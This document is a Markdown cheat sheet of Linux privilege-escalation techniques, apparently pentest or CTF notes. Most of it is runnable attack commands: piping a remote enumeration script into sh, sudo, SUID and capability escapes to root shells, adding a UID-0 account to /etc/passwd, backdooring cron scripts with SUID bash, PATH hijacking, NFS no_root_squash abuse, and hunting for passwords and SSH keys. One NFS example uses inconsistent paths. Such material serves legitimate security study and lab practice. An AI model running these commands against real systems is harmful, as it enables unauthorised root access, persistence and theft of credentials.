# Linux Privilege Escalation

## Goal

Escalate from a low-privileged user to `root` (or another higher-privileged account). This typically involves finding misconfigurations, weak permissions, vulnerable software, or credential exposure.

---

## Enumeration First

Always enumerate thoroughly before trying exploits.

### Automated Enumeration Scripts
```bash
# LinPEAS (most comprehensive)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
./LinEnum.sh

# linux-smart-enumeration
./lse.sh -l 1

# pspy (watch processes without root)
./pspy64
```

---

## System Information

```bash
# OS and kernel version
uname -a
cat /etc/os-release
cat /proc/version

# Running as which user
id
whoami

# Users on the system
cat /etc/passwd
cat /etc/shadow   # if readable — huge win
last              # recent logins

# Sudo version (check for sudo vulnerabilities)
sudo -V
```

---

## Sudo Misconfigurations

```bash
# What can current user run as sudo?
sudo -l
```

### Common Sudo Escapes
If a binary is in `sudoers` without password or with NOPASSWD, check [GTFOBins](https://gtfobins.github.io/).

```bash
# vim
sudo vim -c ':!/bin/bash'

# find
sudo find . -exec /bin/bash \; -quit

# less/more
sudo less /etc/passwd
!/bin/bash  # from within less

# awk
sudo awk 'BEGIN {system("/bin/bash")}'

# python
sudo python3 -c 'import os; os.system("/bin/bash")'

# nmap (older versions)
sudo nmap --interactive
# > !sh

# env
sudo env /bin/bash
```

### Sudo Token Abuse
If you can read another user's sudo token (in `/proc`):
```bash
cat /proc/<pid>/environ | grep SUDO
```

---

## SUID / SGID Binaries

SUID binaries run with the file owner's permissions (often root), regardless of who executes them.

```bash
# Find all SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Find SGID binaries
find / -perm -2000 -type f 2>/dev/null
```

Check found binaries on [GTFOBins](https://gtfobins.github.io/).

### Common SUID Exploits
```bash
# bash (SUID set)
/bin/bash -p   # -p preserves effective UID

# cp (SUID) — overwrite /etc/passwd
cp /etc/passwd /tmp/passwd_backup
openssl passwd -1 -salt xyz "hacked"
# Add new root user line to passwd, then:
cp /tmp/new_passwd /etc/passwd

# find (SUID)
find . -exec /bin/bash -p \; -quit
```

---

## Writable Files and Directories

```bash
# World-writable files
find / -writable -type f 2>/dev/null | grep -v /proc

# World-writable directories
find / -writable -type d 2>/dev/null

# Files owned by current user
find / -user $(whoami) 2>/dev/null
```

### /etc/passwd Writable
If `/etc/passwd` is writable, add a new root user:
```bash
# Generate password hash
openssl passwd -1 "password123"

# Append to /etc/passwd (UID 0 = root)
echo 'hacker:$1$xyz$hashedpass:0:0:root:/root:/bin/bash' >> /etc/passwd

# Switch to new user
su hacker
```

---

## Cron Jobs

Scheduled cron jobs running as root with weak permissions are a common escalation path.

```bash
# View cron jobs
cat /etc/crontab
cat /etc/cron.d/*
ls -la /etc/cron.*
crontab -l

# Watch for processes (use pspy)
./pspy64
```

### If a cron script is world-writable:
```bash
echo 'chmod +s /bin/bash' >> /path/to/cron_script.sh
# Wait for cron to run, then:
/bin/bash -p
```

### If cron uses a relative path / PATH hijacking:
```bash
# If cron runs 'backup.sh' without full path and /tmp is in PATH:
echo '#!/bin/bash' > /tmp/backup.sh
echo 'chmod +s /bin/bash' >> /tmp/backup.sh
chmod +x /tmp/backup.sh
# Add /tmp to PATH before the real script location
```

---

## PATH Hijacking

If a SUID binary or root-owned script calls another program without an absolute path:
```bash
# Inject your own version of the called binary
export PATH=/tmp:$PATH
echo '#!/bin/bash' > /tmp/service
echo '/bin/bash -p' >> /tmp/service
chmod +x /tmp/service
# Run the vulnerable SUID binary
```

---

## Kernel Exploits

Use as a last resort — can crash the system.

```bash
# Check kernel version
uname -r
cat /proc/version

# Search for known exploits
searchsploit linux kernel 4.4
```

**Famous kernel exploits:**
- Dirty COW (CVE-2016-5195) — write to read-only mmap
- Dirty Pipe (CVE-2022-0847) — Linux 5.8–5.16
- OverlayFS (CVE-2023-0386)

---

## Passwords and Credentials

```bash
# History files
cat ~/.bash_history
cat ~/.zsh_history

# Config files with passwords
find / -name "*.conf" -o -name "*.config" -o -name "*.ini" 2>/dev/null | xargs grep -l "password" 2>/dev/null

# SSH keys
ls ~/.ssh/
find / -name id_rsa 2>/dev/null

# Database credentials
cat /var/www/html/config.php
cat /var/www/html/wp-config.php

# Environment variables
env | grep -i pass
```

---

## NFS Misconfiguration

```bash
# Check NFS exports
cat /etc/exports

# If a share has no_root_squash, mount it as root on attacker machine
# and create SUID binary
showmount -e target_ip
mount -t nfs target_ip:/share /mnt/nfs
cp /bin/bash /mnt/nfs/bash
chmod +s /mnt/nfs/bash
# On target:
/tmp/nfs/bash -p
```

---

## Capabilities

Linux capabilities grant specific root privileges to binaries without full SUID.

```bash
# Find binaries with capabilities
getcap -r / 2>/dev/null
```

| Capability | Abuse |
|---|---|
| `cap_setuid` | Set UID to 0 |
| `cap_net_raw` | Raw packet crafting |
| `cap_dac_read_search` | Read any file |

```bash
# python3 with cap_setuid
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

---

## Quick Checklist

- [ ] `sudo -l` — what can we run?
- [ ] SUID/SGID binaries → GTFOBins
- [ ] Writable cron scripts
- [ ] Writable `/etc/passwd` or `/etc/shadow`
- [ ] Check history files for credentials
- [ ] Check config files for passwords
- [ ] Look for internal services on localhost
- [ ] Check capabilities (`getcap -r /`)
- [ ] NFS exports with `no_root_squash`
- [ ] Kernel version → searchsploit

---

## References

- [GTFOBins](https://gtfobins.github.io/)
- [HackTricks Linux PrivEsc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [TryHackMe — Linux PrivEsc](https://tryhackme.com/room/linuxprivesc)
- [PayloadsAllTheThings — Linux PrivEsc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
